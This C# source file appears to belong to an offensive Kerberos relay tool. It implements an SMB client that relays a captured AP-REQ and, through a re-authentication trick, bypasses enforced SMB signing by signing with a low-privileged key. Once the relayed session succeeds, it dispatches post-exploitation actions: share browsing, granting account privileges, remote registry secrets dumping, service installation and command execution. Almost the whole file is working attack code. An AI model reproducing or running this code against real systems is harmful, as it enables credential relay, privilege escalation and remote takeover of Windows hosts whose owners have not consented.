using KrbRelay.Clients.Attacks.Smb;
//using KrbRelay.Com;
using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.Data.SqlTypes;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        private Socket _clientSocket = null;
        public bool alreadyLoggedIn = false;
        public Smb()
        {
            ;

        }
        public Smb(Socket clientSocket)
        {
            _clientSocket = clientSocket;

        }

        public void smbLogin(SMB2Client smbc, byte[] apreqBuffer)
        {

        }
        /// <summary>
        /// reauthx-style bypass for targets that enforce SMB signing.
        /// Opens a base session as a low privileged account (so we know its signing key), then sends the reflected
        /// AP-REQ as a cross-user re-authentication on that same session. The vulnerable server keeps signing with
        /// the low privileged key, so the now privileged session remains usable even though signing is enforced.
        /// </summary>
        private bool reauthConnect(SMB2Client smbc, byte[] apreqBuffer)
        {
            Console.WriteLine("[*] reauth: opening base SMB session as {0}\\{1}", Program.reauthDomain, Program.reauthUser);

            NTStatus baseStatus = smbc.Login(Program.reauthDomain, Program.reauthUser, Program.reauthPassword);
            if (baseStatus != NTStatus.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] reauth: base NTLM session as {0}\\{1} failed: {2}", Program.reauthDomain, Program.reauthUser, baseStatus);
                return false;
            }
            Console.WriteLine("[+] reauth: base session established, low privileged signing key derived");

            NTStatus reauthStatus = smbc.ReauthWithTicket(apreqBuffer);
            Console.WriteLine("[*] reauth: reflected cross-user re-authentication status: {0} (0x{1:X8})", reauthStatus, (uint)reauthStatus);
            if (reauthStatus != NTStatus.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] reauth: target refused the re-authentication - likely patched (same-user re-auth check) or signing key re-derived");
                Console.WriteLine("[-] reauth: falling back is not possible for a signing-enforced target, no attacks will run");
                return false;
            }

            // Verify that the kept (low privileged) signing key is still accepted by the privileged session.
            try
            {
                ISMBFileStore ipc = smbc.TreeConnect("IPC$", out NTStatus treeStatus);
                if (ipc != null)
                {
                    ipc.Disconnect();
                    Console.WriteLine("[+] reauth: privileged session verified against IPC$ (signing with the low privileged key)");
                }
                else
                {
                    Console.WriteLine("[!] reauth: re-auth succeeded but the session could not be verified (TreeConnect IPC$: {0})", treeStatus);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] reauth: session verification failed: {0}", e.Message);
            }

            return true;
        }

        public void smbConnect(SMB2Client smbc, byte[] apreqBuffer)
        {
         
            // Read the binary file into a byte array
            //byte[] byteArray;
            byte[] b = new byte[2];
            int fraglen, authlen;
            //Program.apreqBuffer = byteArray;
            //Array.Copy(Program.apreqBuffer, 8, b, 0, 2);
            Array.Copy(apreqBuffer, 8, b, 0, 2);



            fraglen = BitConverter.ToInt16(b, 0);
            Array.Copy(apreqBuffer, 10, b, 0, 2);

            authlen = BitConverter.ToInt16(b, 0);


            //byte[] destinationArray = new byte[Program.apreqBuffer.Length - ticketOffset]; // Subtract 3 for skipping the first 3 bytes
            byte[] destinationArray = new byte[authlen]; // Subtract 3 for skipping the first 3 bytes
                                                         //Array.Copy(Program.apreqBuffer, ticketOffset, destinationArray, 0, Program.apreqBuffer.Length - ticketOffset);
                                                         //Array.Copy(Program.apreqBuffer, fraglen-authlen, destinationArray, 0,authlen);
            ticket = apreqBuffer;

            bool success = true;
            byte[] response=null;
            if (!alreadyLoggedIn)
            {
                if (Program.reauth)
                {
                    success = reauthConnect(smbc, apreqBuffer);
                }
                else
                {
                    response = smbc.Login(ticket, out success);
                    Console.WriteLine("[*] Login success: {0}", success);
                }
            }
            if (!success)
            {
                if (Program.ntlm)
                {
                    ntlm2 = response;
                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
                }
                else
                {
                    apRep1 = response;
                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));

                }
            }
            else
            {

                //Program.stream.Close();
                Console.WriteLine("[+] SMB session established" );
                //Task.Run(() => tcpFwd.StartPortFwd("192.168.1.79", "445", Program.RedirectHost, "445"));
                //Task.Run(() => Program.tcpFwd.Start());

                //Console.WriteLine("[*] Now starting redirector to {0} port 445  for serving other requests", Program.RedirectHost);
                

                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        nscShares smbs = new nscShares();
                        if (_clientSocket == null)

                            smbs.smbConsole(smbc);
                        else
                            smbs.smbConsole(smbc, _clientSocket);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbc);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbc, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];

                        Attacks.Smb.ServiceManager.serviceInstall(smbc, arg1, arg2);
                    }
                    if (attacks.Keys.Contains("exec"))
                    {
                        //string arg1 = attacks["exec"].Split(new[] { ' ' }, 2)[0];
                        //string arg2 = attacks["exec"].Split(new[] { ' ' }, 2)[1];
                        
                        //tring randomStr = new string(Enumerable.Range(0, 8).Select(_ => (char)('a' + new Random().Next(26))).ToArray());
                        KrbRelay.Clients.Attacks.Smb.Shares.ExecComnmand(smbc, attacks["exec"]);
                        
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                Console.WriteLine("[*] Logging off");

                //Environment.Exit(0);
            }
        }
    
    }
    
}